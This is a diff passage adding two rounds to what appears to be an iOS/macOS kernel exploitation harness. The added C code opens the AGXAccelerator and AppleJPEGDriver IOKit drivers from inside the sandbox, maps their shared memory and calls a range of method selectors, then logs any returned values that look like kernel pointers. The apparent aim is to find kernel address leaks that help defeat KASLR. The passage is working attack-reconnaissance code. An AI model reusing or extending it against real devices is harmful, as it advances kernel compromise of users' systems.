@@ -20323,6 +20323,192 @@ new_modes:
                 }
             }
 
+            } else if (rounds == 174) {
+                /*
+                 * AGXAccelerator type 1 — IOConnectMapMemory + selector scan.
+                 * GPU drivers often have shared memory with kernel pointers.
+                 */
+                rlog("  === r=174: AGXAccelerator shared memory + selector scan ===\n");
+
+                io_service_t agx_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("AGXAccelerator"));
+                rlog("  AGXAccelerator service: %s\n", agx_svc ? "FOUND" : "NOT FOUND");
+
+                if (agx_svc) {
+                    io_connect_t agx_conn = IO_OBJECT_NULL;
+                    kern_return_t akr = IOServiceOpen(agx_svc, mach_task_self(), 1, &agx_conn);
+                    rlog("  AGX type 1 open: 0x%x\n", akr);
+
+                    if (akr == KERN_SUCCESS) {
+                        /* IOConnectMapMemory scan on AGX */
+                        rlog("\n  --- AGX IOConnectMapMemory scan ---\n");
+                        for (uint32_t mtype = 0; mtype < 16; mtype++) {
+                            mach_vm_address_t maddr = 0;
+                            mach_vm_size_t msz = 0;
+                            kern_return_t mkr = IOConnectMapMemory64(agx_conn, mtype,
+                                mach_task_self(), &maddr, &msz, kIOMapAnywhere);
+                            if (mkr == KERN_SUCCESS) {
+                                rlog("  *** AGX memtype %u: addr=0x%llx size=0x%llx ***\n",
+                                     mtype, (unsigned long long)maddr, (unsigned long long)msz);
+                                uint64_t *gp = (uint64_t *)(uintptr_t)maddr;
+                                size_t nqg = (msz < 8192 ? msz : 8192) / 8;
+                                int gkp = 0;
+                                for (size_t q = 0; q < nqg; q++) {
+                                    if ((gp[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                        if (gkp < 20) {
+                                            rlog("    +0x%zx: 0x%llx (KPTR!)\n",
+                                                 q * 8, (unsigned long long)gp[q]);
+                                        }
+                                        gkp++;
+                                    }
+                                }
+                                if (gkp > 0) rlog("    Total KPTRs: %d\n", gkp);
+
+                                /* Also dump first 16 qwords raw */
+                                rlog("    Raw dump (first 128 bytes):\n");
+                                for (size_t q = 0; q < 16 && q < nqg; q++) {
+                                    rlog("    [%2zu] 0x%016llx\n", q, (unsigned long long)gp[q]);
+                                }
+                                IOConnectUnmapMemory64(agx_conn, mtype, mach_task_self(), maddr);
+                            } else if (mkr != 0xE00002C2 && mkr != 0xe00002bd &&
+                                       mkr != 0xe00002bc) {
+                                rlog("  AGX memtype %u: err=0x%x\n", mtype, mkr);
+                            }
+                        }
+
+                        /* AGX selector scan for data return */
+                        rlog("\n  --- AGX selector output scan ---\n");
+                        for (uint32_t sel = 0; sel <= 100; sel++) {
+                            uint8_t gout[4096];
+                            memset(gout, 0xEE, sizeof(gout));
+                            size_t gout_sz = sizeof(gout);
+                            uint32_t gsc_cnt = 16;
+                            uint64_t gsc_out[16];
+                            memset(gsc_out, 0, sizeof(gsc_out));
+                            uint64_t gsc_in[4] = {0};
+
+                            kern_return_t gkr = IOConnectCallMethod(agx_conn, sel,
+                                gsc_in, 1, NULL, 0,
+                                gsc_out, &gsc_cnt, gout, &gout_sz);
+
+                            if (gkr == KERN_SUCCESS) {
+                                rlog("  AGX sel%u: OK sc_out=%u struct_sz=%zu\n",
+                                     sel, gsc_cnt, gout_sz);
+                                for (uint32_t j = 0; j < gsc_cnt; j++) {
+                                    if ((gsc_out[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                        rlog("  *** AGX sel%u: sc[%u]=0x%llx (KPTR!) ***\n",
+                                             sel, j, (unsigned long long)gsc_out[j]);
+                                    } else if (gsc_out[j] != 0) {
+                                        rlog("    AGX sel%u: sc[%u]=0x%llx\n",
+                                             sel, j, (unsigned long long)gsc_out[j]);
+                                    }
+                                }
+                                if (gout_sz > 0) {
+                                    uint64_t *gop = (uint64_t *)gout;
+                                    size_t gnq = gout_sz / 8;
+                                    for (size_t q = 0; q < gnq && q < 64; q++) {
+                                        if ((gop[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                            rlog("  *** AGX sel%u: out[%zu]=0x%llx (KPTR!) ***\n",
+                                                 sel, q, (unsigned long long)gop[q]);
+                                        }
+                                    }
+                                }
+                            } else if (gkr != 0xE00002C2 && gkr != 0xe00002bd &&
+                                       gkr != 0xe00002bc && gkr != 0xe0000001) {
+                                /* Log unexpected errors only */
+                                if (sel < 10 || (sel % 20 == 0))
+                                    rlog("  AGX sel%u: err=0x%x\n", sel, gkr);
+                            }
+                        }
+
+                        IOServiceClose(agx_conn);
+                    }
+                    IOObjectRelease(agx_svc);
+                }
+
+            } else if (rounds == 175) {
+                /*
+                 * AppleJPEGDriver — both types open OK from sandbox.
+                 * Probe for shared memory and selector data returns.
+                 */
+                rlog("  === r=175: AppleJPEGDriver shared memory + selector scan ===\n");
+
+                io_service_t jpeg_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("AppleJPEGDriver"));
+                rlog("  AppleJPEGDriver service: %s\n", jpeg_svc ? "FOUND" : "NOT FOUND");
+
+                if (jpeg_svc) {
+                    for (uint32_t jtype = 0; jtype <= 1; jtype++) {
+                        io_connect_t jpeg_conn = IO_OBJECT_NULL;
+                        kern_return_t jkr = IOServiceOpen(jpeg_svc, mach_task_self(), jtype, &jpeg_conn);
+                        rlog("  JPEG type %u open: 0x%x\n", jtype, jkr);
+
+                        if (jkr == KERN_SUCCESS) {
+                            /* IOConnectMapMemory */
+                            for (uint32_t jm = 0; jm < 8; jm++) {
+                                mach_vm_address_t ja = 0;
+                                mach_vm_size_t js = 0;
+                                kern_return_t jmkr = IOConnectMapMemory64(jpeg_conn, jm,
+                                    mach_task_self(), &ja, &js, kIOMapAnywhere);
+                                if (jmkr == KERN_SUCCESS) {
+                                    rlog("  *** JPEG[%u] memtype %u: addr=0x%llx sz=0x%llx ***\n",
+                                         jtype, jm, (unsigned long long)ja, (unsigned long long)js);
+                                    uint64_t *jp = (uint64_t *)(uintptr_t)ja;
+                                    size_t jnq = (js < 4096 ? js : 4096) / 8;
+                                    for (size_t q = 0; q < jnq && q < 32; q++) {
+                                        if ((jp[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                            rlog("    +0x%zx: 0x%llx (KPTR!)\n",
+                                                 q * 8, (unsigned long long)jp[q]);
+                                        }
+                                    }
+                                    IOConnectUnmapMemory64(jpeg_conn, jm, mach_task_self(), ja);
+                                }
+                            }
+
+                            /* Selector scan */
+                            rlog("  JPEG[%u] selector scan:\n", jtype);
+                            for (uint32_t sel = 0; sel <= 30; sel++) {
+                                uint8_t jout[4096];
+                                memset(jout, 0xEE, sizeof(jout));
+                                size_t jout_sz = sizeof(jout);
+                                uint32_t jsc_cnt = 16;
+                                uint64_t jsc_out[16];
+                                memset(jsc_out, 0, sizeof(jsc_out));
+
+                                kern_return_t jskr = IOConnectCallMethod(jpeg_conn, sel,
+                                    NULL, 0, NULL, 0,
+                                    jsc_out, &jsc_cnt, jout, &jout_sz);
+
+                                if (jskr == KERN_SUCCESS) {
+                                    rlog("    sel%u: OK sc=%u struct=%zu\n",
+                                         sel, jsc_cnt, jout_sz);
+                                    for (uint32_t j = 0; j < jsc_cnt; j++) {
+                                        if ((jsc_out[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                            rlog("    *** sel%u: sc[%u]=0x%llx (KPTR!) ***\n",
+                                                 sel, j, (unsigned long long)jsc_out[j]);
+                                        } else if (jsc_out[j] != 0) {
+                                            rlog("    sel%u: sc[%u]=0x%llx\n",
+                                                 sel, j, (unsigned long long)jsc_out[j]);
+                                        }
+                                    }
+                                    if (jout_sz > 0) {
+                                        uint64_t *jop = (uint64_t *)jout;
+                                        for (size_t q = 0; q < jout_sz / 8 && q < 32; q++) {
+                                            if ((jop[q] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL) {
+                                                rlog("    *** sel%u: out[%zu]=0x%llx (KPTR!) ***\n",
+                                                     sel, q, (unsigned long long)jop[q]);
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                            IOServiceClose(jpeg_conn);
+                        }
+                    }
+                    IOObjectRelease(jpeg_svc);
+                }
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
